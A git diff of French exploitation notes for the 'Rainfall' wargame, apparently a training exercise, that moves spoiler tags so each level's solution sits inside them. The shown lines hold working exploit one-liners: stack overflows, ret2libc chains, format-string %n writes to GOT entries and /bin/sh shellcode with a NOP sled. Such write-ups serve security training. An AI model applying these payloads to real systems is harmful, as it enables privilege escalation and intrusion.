@@ -1,4 +1,4 @@
-# Rainfall — Notes d'exploitation
+# Rainfall — Notes d'exploitation 
 
 > Document de travail pour nous deux.  
 > Objectif : aller droit au but niveau par niveau, avec **faille**, **spoiler**, puis **solution**.
@@ -33,13 +33,13 @@ cat /home/user/levelX/.pass
 
 Le programme vérifie l'argument ; si c'est la bonne valeur numérique, il déclenche le shell.
 
-</details>
 
 ### Solution
 
 ```bash
 ./level0 423
 ```
+</details>
 
 ---
 
@@ -61,13 +61,13 @@ objdump -d -M intel level1 | grep run
 2. Écraser l'adresse de retour avec cette adresse (en little-endian).  
    `0x08048444` devient `\x44\x84\x04\x08`.
 
-</details>
 
 ### Solution
 
 ```bash
 (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
 ```
+</details>
 
 ---
 
@@ -136,13 +136,13 @@ Soit :
 - `0xb7e5ebe0`
 - `0xb7f8cc58`
 
-</details>
 
 ### Solution
 
 ```bash
 (python -c 'print "a" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\x5e\x7e" + "\x58\xcc\xf8\xb7"'; cat) | ./level2
 ```
+</details>
 
 ---
 
@@ -198,13 +198,12 @@ x/s 0x804988c
 - On met l'adresse de `m` (4 octets), puis 60 chars, puis `%4$n`  
   => `4 + 60 = 64`.
 
-</details>
-
 ### Solution
 
 ```bash
 (python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"'; cat) | ./level3
 ```
+</details>
 
 ---
 
@@ -257,13 +256,13 @@ x/s 0x8049810
 - Hors python ne peut pas imprimer autant. Donc on passe par printf
   => `%16930112s`
 
-</details>
 
 ### Solution
 
 ```bash
 (python -c 'print "\x10\x98\x04\x08" + "%16930112s" + "%12$n"'; cat) | ./level4 
 ```
+</details>
 
 ---
 
@@ -329,13 +328,13 @@ $1 = {<text variable, no debug info>} 0x80484a4 <o>
 - Deuxiemement on y rajoute l'address de `o()`. Mais cette fois-ci vu que c'est de l'overwrite, on va la mettre via printf. On converti donc en decimal : **134513824** ==> `"%134513824x"`
 - Enfin on y met notre fameux `"%4$n"`
 
-</details>
 
 ### Solution
 
 ```bash
 (python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat) | ./level5 
 ```
+</details>
 
 ---
 
@@ -368,7 +367,6 @@ $1 = {<text variable, no debug info>} 0x8048454 <n>
 - Premierement on met notre offset  ==> **72 fois**
 - Puis on y rajoute l'address de `n()` ==> `\x54\x84\x04\x08`
 
-</details>
 
 ### Solution
 
@@ -376,6 +374,7 @@ $1 = {<text variable, no debug info>} 0x8048454 <n>
 ./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')
 
 ```
+</details>
 
 ---
 
@@ -442,13 +441,13 @@ $1 = {<text variable, no debug info>} 0x80484f4 <m>
 - Premier argument : offset + address de `puts@got.plt`
 - Deuxieme argument : address de `m()`
 
-</details>
 
 ### Solution
 
 ```bash
 ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 ```
+</details>
 
 ---
 
@@ -489,7 +488,6 @@ On y fout x * (offset - len(payload) - 4), notre shellcode tout en mettant tout 
 
 On le fou en argument au fourneau et puis voila
 
-</details>
 
 ### Solution
 
@@ -506,6 +504,7 @@ dummy = "A" * (offset - len(shellcode) - 4)
 payload = struct.pack("<I", copy + 4) + shellcode + dummy + struct.pack("<I", copy)
 sys.stdout.write(payload)
 ```
+</details>
 
 ---
 
@@ -535,13 +534,13 @@ Le deuxieme argument sera justa apres le offset (ici on prend 14 mais faut juste
 
 ATTENTION ! On apppel le binaire via ~/ et non ./ car noter slide deborde sur l'environnement donc on doit appeler notre binaire avec son environnement.
 
-</details>
 
 ### Solution
 
 ```bash
 (python -c 'print "\x90" * 3000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c "print( 'A' * 14 + '\xb8\xe6\xff\xbf' + 'A')"; cat) | ~/bonus0
 ```
+</details>
 
 ---
 
@@ -566,13 +565,13 @@ ATTENTION ! On apppel le binaire via ~/ et non ./ car noter slide deborde sur l'
 - Le deuxieme argument sera un overflow apres 40 characteres de la valeur demandee de `n` soit `0x574f4c46`
 
 
-</details>
 
 ### Solution
 
 ```bash
 ./bonus1 -2147483637 $(python -c 'print "a" * 40 + "\x46\x4c\x4f\x57"')
 ```
+</details>
 
 ---
 
@@ -632,13 +631,13 @@ Breakpoint 1, 0x080485a6 in main ()
 - Le deuxieme argument sera un overflow apres 18 characteres de la valeur demandee de `LANG` soit `0xbffffdf2`
 
 
-</details>
 
 ### Solution
 
 ```bash
 bonus2@RainFall:~$ ./bonus2 $(python -c 'print "a" * 40') $(python -c 'print "a" * 18 + "\xf2\xfd\xff\xbf"')
 ```
+</details>
 
 ---
 
@@ -668,13 +667,13 @@ Donc si on passe un argument vide, bah password sera vide aussi ptdrr
 - On y met RIENG
 
 
-</details>
 
 ### Solution
 
 ```bash
 bonus3@RainFall:~$ ./bonus3 ""
 ```
+</details>
 
 ---
 
